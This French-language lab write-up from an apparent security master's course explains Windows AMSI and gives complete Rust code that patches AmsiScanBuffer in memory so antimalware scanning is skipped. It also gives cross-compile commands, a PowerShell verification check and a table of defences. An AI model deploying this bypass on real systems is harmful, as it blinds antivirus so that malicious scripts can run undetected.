# Write-up — Lab 16 : Rust AMSI Bypass

> **Pilier 3 — Embarqué / C-ASM x86-64 · Rust Malware Dev**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![Rust](https://img.shields.io/badge/lang-Rust-orange.svg)]()
[![AMSI](https://img.shields.io/badge/target-AMSI-red.svg)]()
[![Windows](https://img.shields.io/badge/OS-Windows-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** AMSI (Antimalware Scan Interface) — Windows intercepte les scripts PowerShell/CLR avant exécution  
**Technique :** Patcher `AmsiScanBuffer` en mémoire via `VirtualProtect` → `mov eax, 0x80070057 ; ret`  
**Résultat :** AMSI retourne `E_INVALIDARG` → le runtime considère le scan comme échoué → laisse passer

---

## 2. Qu'est-ce qu'AMSI ?

AMSI est une API Windows qui permet aux AV d'inspecter le contenu de scripts (PowerShell, VBScript, JScript) avant leur exécution. Le flux :

```
PowerShell → AmsiScanBuffer(contenu) → AV → AMSI_RESULT_DETECTED → bloqué
```

Le bypass consiste à corrompre `AmsiScanBuffer` pour qu'elle retourne une erreur avant même d'appeler l'AV.

---

## 3. Patch — `AmsiScanBuffer`

Avant patch (prologue typique x64) :
```asm
AmsiScanBuffer:
    mov r11, rsp
    push rbx
    push rdi
    ...
```

Après patch (6 bytes écrasés) :
```asm
AmsiScanBuffer:
    mov eax, 0x80070057   ; B8 57 00 07 80  → E_INVALIDARG
    ret                   ; C3
```

`E_INVALIDARG` : le caller (PowerShell/CLR) interprète ce code d'erreur comme "scan inapplicable" → exécution continue.

---

## 4. Code — `amsi_bypass/src/main.rs`

```rust
#[cfg(windows)]
fn amsi_bypass() -> bool {
    unsafe {
        LoadLibraryA(b"amsi.dll\0".as_ptr() as _);
        let h_amsi = GetModuleHandleA(b"amsi.dll\0".as_ptr() as _);
        let fn_addr = GetProcAddress(h_amsi, b"AmsiScanBuffer\0".as_ptr() as _) as *mut u8;

        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let mut old: u32 = 0;

        VirtualProtect(fn_addr as _, 6, PAGE_EXECUTE_READWRITE, &mut old);
        std::ptr::copy_nonoverlapping(patch.as_ptr(), fn_addr, 6);
        VirtualProtect(fn_addr as _, 6, old, &mut old);
    }
    true
}
```

---

## 5. Compilation — cross-compile depuis WSL2

```bash
# Installer le toolchain MinGW
sudo apt-get install -y gcc-mingw-w64-x86-64

# Ajouter la cible Windows
rustup target add x86_64-pc-windows-gnu

# Compiler
cd amsi_bypass
cargo build --release --target x86_64-pc-windows-gnu
# → target/x86_64-pc-windows-gnu/release/amsi_bypass.exe
```

---

## 6. Test sur Windows

```powershell
# 1. Exécuter le bypass
.\amsi_bypass.exe
# [+] AmsiScanBuffer @ 0x7ffb1234...
# [+] AMSI neutralisé

# 2. Vérifier dans PowerShell (méthode réflexion)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.GetValue($null)
# True → AMSI désactivé dans ce processus
```

---

## 7. Défense

| Vecteur | Mesure |
| --- | --- |
| Patch mémoire | ETW (Event Tracing) — journalise les appels VirtualProtect suspects |
| LoadLibrary amsi.dll | Surveiller les appels LoadLibrary depuis des processus non-attendus |
| Patch AmsiScanBuffer | Integrity check — comparer hash de la fonction au démarrage |
| Exécution binaire non signé | AppLocker / WDAC |

---

## 8. Progression Rust Red Team

| Lab | Technique | OS |
| --- | --- | --- |
| Lab14 | Reverse shell | Linux |
| Lab15 | Process injection (ptrace) | Linux |
| **Lab16** | **AMSI bypass** | **Windows** |
| Lab17 | Shellcode loader | Linux/Windows |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Cible | `AmsiScanBuffer` dans `amsi.dll` |
| Patch | `B8 57 00 07 80 C3` (6 bytes) |
| Code retour | `E_INVALIDARG` (0x80070057) |
| API clé | `VirtualProtect` + `copy_nonoverlapping` |
| Cross-compile | `x86_64-pc-windows-gnu` depuis WSL2 |

> Screenshot : [docs/lab16_amsi_bypass.png](docs/lab16_amsi_bypass.png)

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
